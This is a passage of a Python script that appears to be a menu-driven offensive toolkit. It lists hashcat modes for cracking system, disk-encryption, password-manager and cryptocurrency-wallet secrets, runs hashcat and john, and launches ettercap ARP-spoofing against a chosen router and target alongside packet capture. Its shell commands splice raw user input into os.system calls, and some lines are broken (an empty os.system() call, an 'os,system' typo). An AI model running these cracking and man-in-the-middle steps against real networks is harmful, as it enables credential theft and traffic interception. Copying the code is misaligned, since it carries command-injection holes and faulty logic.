  29100 | Flask Session Cookie ($salt.$salt.$pass)                   | Network Protocol
   4800 | iSCSI CHAP authentication, MD5(CHAP)                       | Network Protocol
   8500 | RACF                                                       | Operating System
   6300 | AIX (smd5)                                                 | Operating System
   6700 | AIX (ssha1)                                                | Operating System
   6400 | AIX (ssha256)                                              | Operating System
   6500 | AIX (ssha512)                                              | Operating System
   3000 | LM                                                         | Operating System
  19000 | QNX /etc/shadow (MD5)                                      | Operating System
  19100 | QNX /etc/shadow (SHA256)                                   | Operating System
  19200 | QNX /etc/shadow (SHA512)                                   | Operating System
  15300 | DPAPI masterkey file v1 (context 1 and 2)                  | Operating System
  15310 | DPAPI masterkey file v1 (context 3)                        | Operating System
  15900 | DPAPI masterkey file v2 (context 1 and 2)                  | Operating System
  15910 | DPAPI masterkey file v2 (context 3)                        | Operating System
   7200 | GRUB 2                                                     | Operating System
  12800 | MS-AzureSync PBKDF2-HMAC-SHA256                            | Operating System
  12400 | BSDi Crypt, Extended DES                                   | Operating System
   1000 | NTLM                                                       | Operating System
   9900 | Radmin2                                                    | Operating System
   5800 | Samsung Android Password/PIN                               | Operating System
  28100 | Windows Hello PIN/Password                                 | Operating System
  13800 | Windows Phone 8+ PIN/password                              | Operating System
   2410 | Cisco-ASA MD5                                              | Operating System
   9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                              | Operating System
   9300 | Cisco-IOS $9$ (scrypt)                                     | Operating System
   5700 | Cisco-IOS type 4 (SHA256)                                  | Operating System
   2400 | Cisco-PIX MD5                                              | Operating System
   8100 | Citrix NetScaler (SHA1)                                    | Operating System
  22200 | Citrix NetScaler (SHA512)                                  | Operating System
   1100 | Domain Cached Credentials (DCC), MS Cache                  | Operating System
   2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2             | Operating System
   7000 | FortiGate (FortiOS)                                        | Operating System
  26300 | FortiGate256 (FortiOS256)                                  | Operating System
    125 | ArubaOS                                                    | Operating System
    501 | Juniper IVE                                                | Operating System
     22 | Juniper NetScreen/SSG (ScreenOS)                           | Operating System
  15100 | Juniper/NetBSD sha1crypt                                   | Operating System
  26500 | iPhone passcode (UID key + System Keybag)                  | Operating System
    122 | macOS v10.4, macOS v10.5, macOS v10.6                      | Operating System
   1722 | macOS v10.7                                                | Operating System
   7100 | macOS v10.8+ (PBKDF2-SHA512)                               | Operating System
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                  | Operating System
   1500 | descrypt, DES (Unix), Traditional DES                      | Operating System
  29000 | sha1($salt.sha1(utf16le($username).':'.utf16le($pass)))    | Operating System
   7400 | sha256crypt $5$, SHA256 (Unix)                             | Operating System
   1800 | sha512crypt $6$, SHA512 (Unix)                             | Operating System
  24600 | SQLCipher                                                  | Database Server
    131 | MSSQL (2000)                                               | Database Server
    132 | MSSQL (2005)                                               | Database Server
   1731 | MSSQL (2012, 2014)                                         | Database Server
  24100 | MongoDB ServerKey SCRAM-SHA-1                              | Database Server
  24200 | MongoDB ServerKey SCRAM-SHA-256                            | Database Server
     12 | PostgreSQL                                                 | Database Server
  11100 | PostgreSQL CRAM (MD5)                                      | Database Server
  28600 | PostgreSQL SCRAM-SHA-256                                   | Database Server
   3100 | Oracle H: Type (Oracle 7+)                                 | Database Server
    112 | Oracle S: Type (Oracle 11+)                                | Database Server
  12300 | Oracle T: Type (Oracle 12+)                                | Database Server
   7401 | MySQL $A$ (sha256crypt)                                    | Database Server
  11200 | MySQL CRAM (SHA1)                                          | Database Server
    200 | MySQL323                                                   | Database Server
    300 | MySQL4.1/MySQL5                                            | Database Server
   8000 | Sybase ASE                                                 | Database Server
   8300 | DNSSEC (NSEC3)                                             | FTP, HTTP, SMTP, LDAP Server
  25900 | KNX IP Secure - Device Authentication Code                 | FTP, HTTP, SMTP, LDAP Server
  16400 | CRAM-MD5 Dovecot                                           | FTP, HTTP, SMTP, LDAP Server
   1411 | SSHA-256(Base64), LDAP (SSHA256)                           | FTP, HTTP, SMTP, LDAP Server
   1711 | SSHA-512(Base64), LDAP (SSHA512)                           | FTP, HTTP, SMTP, LDAP Server
  24900 | Dahua Authentication MD5                                   | FTP, HTTP, SMTP, LDAP Server
  10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)                    | FTP, HTTP, SMTP, LDAP Server
  15000 | FileZilla Server >= 0.9.55                                 | FTP, HTTP, SMTP, LDAP Server
  12600 | ColdFusion 10+                                             | FTP, HTTP, SMTP, LDAP Server
   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)                      | FTP, HTTP, SMTP, LDAP Server
    141 | Episerver 6.x < .NET 4                                     | FTP, HTTP, SMTP, LDAP Server
   1441 | Episerver 6.x >= .NET 4                                    | FTP, HTTP, SMTP, LDAP Server
   1421 | hMailServer                                                | FTP, HTTP, SMTP, LDAP Server
    101 | nsldap, SHA-1(Base64), Netscape LDAP SHA                   | FTP, HTTP, SMTP, LDAP Server
    111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA                | FTP, HTTP, SMTP, LDAP Server
   7700 | SAP CODVN B (BCODE)                                        | Enterprise Application Software (EAS)
   7701 | SAP CODVN B (BCODE) from RFC_READ_TABLE                    | Enterprise Application Software (EAS)
   7800 | SAP CODVN F/G (PASSCODE)                                   | Enterprise Application Software (EAS)
   7801 | SAP CODVN F/G (PASSCODE) from RFC_READ_TABLE               | Enterprise Application Software (EAS)
  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                        | Enterprise Application Software (EAS)
    133 | PeopleSoft                                                 | Enterprise Application Software (EAS)
  13500 | PeopleSoft PS_TOKEN                                        | Enterprise Application Software (EAS)
  21500 | SolarWinds Orion                                           | Enterprise Application Software (EAS)
  21501 | SolarWinds Orion v2                                        | Enterprise Application Software (EAS)
     24 | SolarWinds Serv-U                                          | Enterprise Application Software (EAS)
   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)
   8700 | Lotus Notes/Domino 6                                       | Enterprise Application Software (EAS)
   9100 | Lotus Notes/Domino 8                                       | Enterprise Application Software (EAS)
  26200 | OpenEdge Progress Encode                                   | Enterprise Application Software (EAS)
  20600 | Oracle Transportation Management (SHA256)                  | Enterprise Application Software (EAS)
   4711 | Huawei sha1(md5($pass).$salt)                              | Enterprise Application Software (EAS)
  20711 | AuthMe sha256                                              | Enterprise Application Software (EAS)
  22400 | AES Crypt (SHA256)                                         | Full-Disk Encryption (FDE)
  27400 | VMware VMX (PBKDF2-HMAC-SHA1 + AES-256-CBC)                | Full-Disk Encryption (FDE)
  14600 | LUKS v1 (legacy)                                           | Full-Disk Encryption (FDE)
  29541 | LUKS v1 RIPEMD-160 + AES                                   | Full-Disk Encryption (FDE)
  29542 | LUKS v1 RIPEMD-160 + Serpent                               | Full-Disk Encryption (FDE)
  29543 | LUKS v1 RIPEMD-160 + Twofish                               | Full-Disk Encryption (FDE)
  29511 | LUKS v1 SHA-1 + AES                                        | Full-Disk Encryption (FDE)
  29512 | LUKS v1 SHA-1 + Serpent                                    | Full-Disk Encryption (FDE)
  29513 | LUKS v1 SHA-1 + Twofish                                    | Full-Disk Encryption (FDE)
  29521 | LUKS v1 SHA-256 + AES                                      | Full-Disk Encryption (FDE)
  29522 | LUKS v1 SHA-256 + Serpent                                  | Full-Disk Encryption (FDE)
  29523 | LUKS v1 SHA-256 + Twofish                                  | Full-Disk Encryption (FDE)
  29531 | LUKS v1 SHA-512 + AES                                      | Full-Disk Encryption (FDE)
  29532 | LUKS v1 SHA-512 + Serpent                                  | Full-Disk Encryption (FDE)
  29533 | LUKS v1 SHA-512 + Twofish                                  | Full-Disk Encryption (FDE)
  13711 | VeraCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
  13712 | VeraCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
  13713 | VeraCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
  13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
  13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  29411 | VeraCrypt RIPEMD160 + XTS 512 bit                          | Full-Disk Encryption (FDE)
  29412 | VeraCrypt RIPEMD160 + XTS 1024 bit                         | Full-Disk Encryption (FDE)
  29413 | VeraCrypt RIPEMD160 + XTS 1536 bit                         | Full-Disk Encryption (FDE)
  29441 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode              | Full-Disk Encryption (FDE)
  29442 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode             | Full-Disk Encryption (FDE)
  29443 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode             | Full-Disk Encryption (FDE)
  13751 | VeraCrypt SHA256 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy)        | Full-Disk Encryption (FDE)
  13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  29451 | VeraCrypt SHA256 + XTS 512 bit                             | Full-Disk Encryption (FDE)
  29452 | VeraCrypt SHA256 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
  29453 | VeraCrypt SHA256 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
  29461 | VeraCrypt SHA256 + XTS 512 bit + boot-mode                 | Full-Disk Encryption (FDE)
  29462 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode                | Full-Disk Encryption (FDE)
  29463 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode                | Full-Disk Encryption (FDE)
  13721 | VeraCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13722 | VeraCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13723 | VeraCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  29421 | VeraCrypt SHA512 + XTS 512 bit                             | Full-Disk Encryption (FDE)
  29422 | VeraCrypt SHA512 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
  29423 | VeraCrypt SHA512 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
  13771 | VeraCrypt Streebog-512 + XTS 512 bit (legacy)              | Full-Disk Encryption (FDE)
  13772 | VeraCrypt Streebog-512 + XTS 1024 bit (legacy)             | Full-Disk Encryption (FDE)
  13773 | VeraCrypt Streebog-512 + XTS 1536 bit (legacy)             | Full-Disk Encryption (FDE)
  13781 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode (legacy)  | Full-Disk Encryption (FDE)
  13782 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
  13783 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
  29471 | VeraCrypt Streebog-512 + XTS 512 bit                       | Full-Disk Encryption (FDE)
  29472 | VeraCrypt Streebog-512 + XTS 1024 bit                      | Full-Disk Encryption (FDE)
  29473 | VeraCrypt Streebog-512 + XTS 1536 bit                      | Full-Disk Encryption (FDE)
  29481 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode           | Full-Disk Encryption (FDE)
  29482 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode          | Full-Disk Encryption (FDE)
  29483 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode          | Full-Disk Encryption (FDE)
  13731 | VeraCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
  13732 | VeraCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
  13733 | VeraCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
  29431 | VeraCrypt Whirlpool + XTS 512 bit                          | Full-Disk Encryption (FDE)
  29432 | VeraCrypt Whirlpool + XTS 1024 bit                         | Full-Disk Encryption (FDE)
  29433 | VeraCrypt Whirlpool + XTS 1536 bit                         | Full-Disk Encryption (FDE)
  23900 | BestCrypt v3 Volume Encryption                             | Full-Disk Encryption (FDE)
  16700 | FileVault 2                                                | Full-Disk Encryption (FDE)
  27500 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-128-XTS)              | Full-Disk Encryption (FDE)
  27600 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS)              | Full-Disk Encryption (FDE)
  20011 | DiskCryptor SHA512 + XTS 512 bit                           | Full-Disk Encryption (FDE)
  20012 | DiskCryptor SHA512 + XTS 1024 bit                          | Full-Disk Encryption (FDE)
  20013 | DiskCryptor SHA512 + XTS 1536 bit                          | Full-Disk Encryption (FDE)
  22100 | BitLocker                                                  | Full-Disk Encryption (FDE)
  12900 | Android FDE (Samsung DEK)                                  | Full-Disk Encryption (FDE)
   8800 | Android FDE <= 4.3                                         | Full-Disk Encryption (FDE)
  18300 | Apple File System (APFS)                                   | Full-Disk Encryption (FDE)
   6211 | TrueCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
   6212 | TrueCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
   6213 | TrueCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
   6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
   6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
   6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  29311 | TrueCrypt RIPEMD160 + XTS 512 bit                          | Full-Disk Encryption (FDE)
  29312 | TrueCrypt RIPEMD160 + XTS 1024 bit                         | Full-Disk Encryption (FDE)
  29313 | TrueCrypt RIPEMD160 + XTS 1536 bit                         | Full-Disk Encryption (FDE)
  29341 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode              | Full-Disk Encryption (FDE)
  29342 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode             | Full-Disk Encryption (FDE)
  29343 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode             | Full-Disk Encryption (FDE)
   6221 | TrueCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
   6222 | TrueCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
   6223 | TrueCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  29321 | TrueCrypt SHA512 + XTS 512 bit                             | Full-Disk Encryption (FDE)
  29322 | TrueCrypt SHA512 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
  29323 | TrueCrypt SHA512 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
   6231 | TrueCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
   6232 | TrueCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
   6233 | TrueCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
  29331 | TrueCrypt Whirlpool + XTS 512 bit                          | Full-Disk Encryption (FDE)
  29332 | TrueCrypt Whirlpool + XTS 1024 bit                         | Full-Disk Encryption (FDE)
  29333 | TrueCrypt Whirlpool + XTS 1536 bit                         | Full-Disk Encryption (FDE)
  12200 | eCryptfs                                                   | Full-Disk Encryption (FDE)
  10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                              | Document
  10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1                 | Document
  10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2                 | Document
  10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                              | Document
  25400 | PDF 1.4 - 1.6 (Acrobat 5 - 8) - user and owner pass        | Document
  10600 | PDF 1.7 Level 3 (Acrobat 9)                                | Document
  10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                          | Document
   9400 | MS Office 2007                                             | Document
   9500 | MS Office 2010                                             | Document
   9600 | MS Office 2013                                             | Document
  25300 | MS Office 2016 - SheetProtection                           | Document
   9700 | MS Office <= 2003 $0/$1, MD5 + RC4                         | Document
   9710 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1            | Document
   9720 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2            | Document
   9810 | MS Office <= 2003 $3, SHA1 + RC4, collider #1              | Document
   9820 | MS Office <= 2003 $3, SHA1 + RC4, collider #2              | Document
   9800 | MS Office <= 2003 $3/$4, SHA1 + RC4                        | Document
  18400 | Open Document Format (ODF) 1.2 (SHA-256, AES)              | Document
  18600 | Open Document Format (ODF) 1.1 (SHA-1, Blowfish)           | Document
  16200 | Apple Secure Notes                                         | Document
  23300 | Apple iWork                                                | Document
   6600 | 1Password, agilekeychain                                   | Password Manager
   8200 | 1Password, cloudkeychain                                   | Password Manager
   9000 | Password Safe v2                                           | Password Manager
   5200 | Password Safe v3                                           | Password Manager
   6800 | LastPass + LastPass sniffed                                | Password Manager
  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
  23400 | Bitwarden                                                  | Password Manager
  16900 | Ansible Vault                                              | Password Manager
  26000 | Mozilla key3.db                                            | Password Manager
  26100 | Mozilla key4.db                                            | Password Manager
  23100 | Apple Keychain                                             | Password Manager
  11600 | 7-Zip                                                      | Archive
  12500 | RAR3-hp                                                    | Archive
  23800 | RAR3-p (Compressed)                                        | Archive
  23700 | RAR3-p (Uncompressed)                                      | Archive
  13000 | RAR5                                                       | Archive
  17220 | PKZIP (Compressed Multi-File)                              | Archive
  17200 | PKZIP (Compressed)                                         | Archive
  17225 | PKZIP (Mixed Multi-File)                                   | Archive
  17230 | PKZIP (Mixed Multi-File Checksum-Only)                     | Archive
  17210 | PKZIP (Uncompressed)                                       | Archive
  20500 | PKZIP Master Key                                           | Archive
  20510 | PKZIP Master Key (6 byte optimization)                     | Archive
  23001 | SecureZIP AES-128                                          | Archive
  23002 | SecureZIP AES-192                                          | Archive
  23003 | SecureZIP AES-256                                          | Archive
  13600 | WinZip                                                     | Archive
  18900 | Android Backup                                             | Archive
  24700 | Stuffit5                                                   | Archive
  13200 | AxCrypt 1                                                  | Archive
  13300 | AxCrypt 1 in-memory SHA1                                   | Archive
  23500 | AxCrypt 2 AES-128                                          | Archive
  23600 | AxCrypt 2 AES-256                                          | Archive
  14700 | iTunes backup < 10.0                                       | Archive
  14800 | iTunes backup >= 10.0                                      | Archive
   8400 | WBB3 (Woltlab Burning Board)                               | Forums, CMS, E-Commerce
   2612 | PHPS                                                       | Forums, CMS, E-Commerce
    121 | SMF (Simple Machines Forum) > v1.1                         | Forums, CMS, E-Commerce
   3711 | MediaWiki B type                                           | Forums, CMS, E-Commerce
   4521 | Redmine                                                    | Forums, CMS, E-Commerce
  24800 | Umbraco HMAC-SHA1                                          | Forums, CMS, E-Commerce
     11 | Joomla < 2.5.18                                            | Forums, CMS, E-Commerce
  13900 | OpenCart                                                   | Forums, CMS, E-Commerce
  11000 | PrestaShop                                                 | Forums, CMS, E-Commerce
  16000 | Tripcode                                                   | Forums, CMS, E-Commerce
   7900 | Drupal7                                                    | Forums, CMS, E-Commerce
   4522 | PunBB                                                      | Forums, CMS, E-Commerce
   2811 | MyBB 1.2+, IPB2+ (Invision Power Board)                    | Forums, CMS, E-Commerce
   2611 | vBulletin < v3.8.5                                         | Forums, CMS, E-Commerce
   2711 | vBulletin >= v3.8.5                                        | Forums, CMS, E-Commerce
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
     21 | osCommerce, xt:Commerce                                    | Forums, CMS, E-Commerce
  18100 | TOTP (HMAC-SHA1)                                           | One-Time Password
   2000 | STDOUT                                                     | Plaintext
  99999 | Plaintext                                                  | Plaintext
  21600 | Web2py pbkdf2-sha512                                       | Framework
  10000 | Django (PBKDF2-SHA256)                                     | Framework
    124 | Django (SHA-1)                                             | Framework
  12001 | Atlassian (PBKDF2-HMAC-SHA1)                               | Framework
  19500 | Ruby on Rails Restful-Authentication                       | Framework
  27200 | Ruby on Rails Restful Auth (one round, no sitekey)         | Framework
  30000 | Python Werkzeug MD5 (HMAC-MD5 (key = $salt))               | Framework
  30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt))         | Framework
  20200 | Python passlib pbkdf2-sha512                               | Framework
  20300 | Python passlib pbkdf2-sha256                               | Framework
  20400 | Python passlib pbkdf2-sha1                                 | Framework
  24410 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA1 + 3DES/AES)          | Private Key
  24420 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES)        | Private Key
  15500 | JKS Java Key Store Private Keys (SHA1)                     | Private Key
  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)                      | Private Key
  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)                  | Private Key
  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)                      | Private Key
  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)                      | Private Key
  23200 | XMPP SCRAM PBKDF2-SHA1                                     | Instant Messaging Service
  28300 | Teamspeak 3 (channel hash)                                 | Instant Messaging Service
  22600 | Telegram Desktop < v2.1.14 (PBKDF2-HMAC-SHA1)              | Instant Messaging Service
  24500 | Telegram Desktop >= v2.1.14 (PBKDF2-HMAC-SHA512)           | Instant Messaging Service
  22301 | Telegram Mobile App Passcode (SHA256)                      | Instant Messaging Service
     23 | Skype                                                      | Instant Messaging Service
  29600 | Terra Station Wallet (AES256-CBC(PBKDF2($pass)))           | Cryptocurrency Wallet
  26600 | MetaMask Wallet                                            | Cryptocurrency Wallet
  21000 | BitShares v0.x - sha512(sha512_bin(pass))                  | Cryptocurrency Wallet
  28501 | Bitcoin WIF private key (P2PKH), compressed                | Cryptocurrency Wallet
  28502 | Bitcoin WIF private key (P2PKH), uncompressed              | Cryptocurrency Wallet
  28503 | Bitcoin WIF private key (P2WPKH, Bech32), compressed       | Cryptocurrency Wallet
  28504 | Bitcoin WIF private key (P2WPKH, Bech32), uncompressed     | Cryptocurrency Wallet
  28505 | Bitcoin WIF private key (P2SH(P2WPKH)), compressed         | Cryptocurrency Wallet
  28506 | Bitcoin WIF private key (P2SH(P2WPKH)), uncompressed       | Cryptocurrency Wallet
  11300 | Bitcoin/Litecoin wallet.dat                                | Cryptocurrency Wallet
  16600 | Electrum Wallet (Salt-Type 1-3)                            | Cryptocurrency Wallet
  21700 | Electrum Wallet (Salt-Type 4)                              | Cryptocurrency Wallet
  21800 | Electrum Wallet (Salt-Type 5)                              | Cryptocurrency Wallet
  12700 | Blockchain, My Wallet                                      | Cryptocurrency Wallet
  15200 | Blockchain, My Wallet, V2                                  | Cryptocurrency Wallet
  18800 | Blockchain, My Wallet, Second Password (SHA256)            | Cryptocurrency Wallet
  25500 | Stargazer Stellar Wallet XLM                               | Cryptocurrency Wallet
  16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256               | Cryptocurrency Wallet
  15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256                        | Cryptocurrency Wallet
  15700 | Ethereum Wallet, SCRYPT                                    | Cryptocurrency Wallet
  22500 | MultiBit Classic .key (MD5)                                | Cryptocurrency Wallet
  27700 | MultiBit Classic .wallet (scrypt)                          | Cryptocurrency Wallet
  22700 | MultiBit HD (scrypt)                                       | Cryptocurrency Wallet
  28200 | Exodus Desktop Wallet (scrypt)                             | Cryptocurrency Wallet""")
        print()
        new9 = input("Choose a hash mode: ")
        new10 = input("Enter file name to save the output(.txt): ")
        new12 = input("Enter wordlist file: ")
        new11 = input("Do you have list of hashs? [y, n]")
        if new11 == "y":
            new13 = input("Enter list of your hashes: ")
            print("Start cracking...")
            time.sleep(1)
            os.system(f'hashcat -a {new8} -m {new9} -o {new10} {new13} {new12}')
            print()
            print()
            gotomenu = input("Press Enter to quit!")
        elif new11 == "n":
            new14 = input("Enter your hash: ")
            print("start cracking...")
            time.sleep(1)
            os.system(f'hashcat -a {new8} -m {new9} -o {new10} "{new14}" {new12}')
            print()
            print()
            gotomenu = input("Press Enter to quit!")
        else:
            Menu()
    if choose8 == "2":
        os.system('clear')
        print("""
        raw-md5
        raw-sha1
        raw-sha256
        raw-sha512
        """)
        print()
        new15 = input("Choose a format that contains with your hash(type the format): ")
        new16 = input("Enter your hash.txt file: ")
        os.system(f'john --format={new15} {new16}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose8 == "99":
        Menu()

def Sniffing_and_Spoofing():
    os.system('clear')
    print('.dP"Y8  88    88  8888  888888  888888')
    print('`Ydo."  8888  88   88   88__    88__')
    print('o.`y8b  88 88 88   88   88""    88""')
    print('8bodP"  88  8888  8888  88      88')
    print()
    list20 = ["1", "2", "3", "4", "5", "6", "7", "8", "00"]
    print("[1]--ettercap")
    print("[2]--tcpdump")
    print("[3]--tshark")
    print("[4]--ngrep")
    print("[5]--netcat")
    print("[6]--scapy(python)")
    print("[7]--iftop")
    print("[8]--nmap")
    print("[00]--exit")
    print()
    choice7 = input("SC ~# ")

    if choice7 == "1":
        ETTERCAP()
    elif choice7 == "2":
        TCPDUMP()
    elif choice7 == "3":
        TSHARK()
    elif choice7 == "4":
        NGREP()
    elif choice7 == "5":
        NETCAT()
    elif choice7 == "6":
        SCAPY()
    elif choice7 == "7":
        IFTOP()
    elif choice7 == "8":
        NmAp()
    elif choice7 == "00":
        Menu()
    else:
        os.system('clear')
        print("there is no option, try again!")
        time.sleep(2)

def ETTERCAP():
    os.system('clear')
    print("-----ettercap-----")
    newlist = ["1", "2", "99"]
    print()
    print("[1]--arpscan(if you connected to a router(WIFI))")
    print("[2]--use ettercap to capture router and your target(if you connected to router(WIFI))")
    print("[99]--exit")
    print()
    choose9 = input("Choose an option: ")
    if choose9 == "1":
        os.system('clear')
        print("after arp-scan ended in 8 seconds, please copy the ip address of your target.")
        time.sleep(3)
        os.system('clear')
        os.system('iwconfig')
        new17 = input("Choose your interface: ")
        print("starting the tool...")
        time.sleep(1)
        os.system(f'sudo arp-scan --interface {new17} -l')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
        time.sleep(8)
        ETTERCAP()
    elif choose9 == "2":
        os.system()
        new19 = input("Enter target router ip(if you don't know type : ifconfig , to see the router ip): ")
        if new19 == "ifconfig":
            os.system('clear')
            print("please remind the router ip from 'wlan0' or the wifi interface in 5 second.")
            time.sleep(2)
            print()
            os.system('ifconfig')
            time.sleep(5)
            ETTERCAP()
        else:
            new20 = input("Enter target ip address you copied from arp-scan(if you know the target ip type it): ")
            os.system('clear')
            print("we gonna open wireshark, in 8 seconds, please go to wlan0, then we gonna start ettercap")
            time.sleep(2)
            print("starting wireshark...")
            time.sleep(1)
            os,system('wireshark')
            time.sleep(8)
            os.system(f'sudo ettercap -T -S -i wlan0 -M arp:remote /{new19}// /{new20}//')
            print()
            print()
            gotomenu = input("Press Enter to quit!")
    if choose9 == "99":
        Menu()

def TCPDUMP():
    os.system('clear')
    print("-----tcpdump-----")
    print()
    newlist2 = ["1", "2", "3", "99"]
    print("[1]--basic capture")
    print("[2]--capture and save to a file(.pcap)")
    print("[3]--read from file(.pcap)")
    print("[99]--exit")
    print()
    choose10 = input("choose an option: ")
    if choose10 == "1":
        os.system('clear')
        os.system('iwconfig')
        newchoose = input("choose an interface: ")
        print("starting tcpdump...")
        time.sleep(1)
        os.system(f'tcpdump -i {newchoose}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose10 == "2":
        os.system('clear')
        os.system('iwconfig')
        newchoose2 = input("choose an interface: ")
        savefile = input("Enter a file name to save the capture(with .pcap like: capture.pcap): ")
        print("starting tcpdump...")
        time.sleep(1)
        os.system(f'tcpdump -i {newchoose2} -w {savefile}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose10 == "3":
        os.system('clear')
        readfile = input("Enter a .pcap file to read: ")
        print("starting tcpdump...")
        time.sleep(1)
        os.system(f'tcpdump -r {readfile}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose10 == "99":
        Menu()

def TSHARK():
    os.system('clear')
    print("-----tshark-----")
    print()
    newlist3 = ["1", "2", "99"]
    print("[1]--basic capture")
    print("[2]--Save the capture to a file")
    print("[99]--exit")
    print()
    choose11 = input("Choose an option: ")
    if choose11 == "1":
        os.system('clear')
        os.system('iwconfig')
        newchoose3 = input("Choose an interface: ")
        print("starting tshark...")
        time.sleep(1)
        os.system(f'tshark -i {newchoose3}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose11 == "2":
        os.system('clear')
        os.system('iwconfig')
        newchoose4 = input("Choose an interface: ")
        savefile2 = input("Enter a file name to save the capture(with .pcap like: capture.pcap): ")
        print("starting tshark...")
        time.sleep(1)
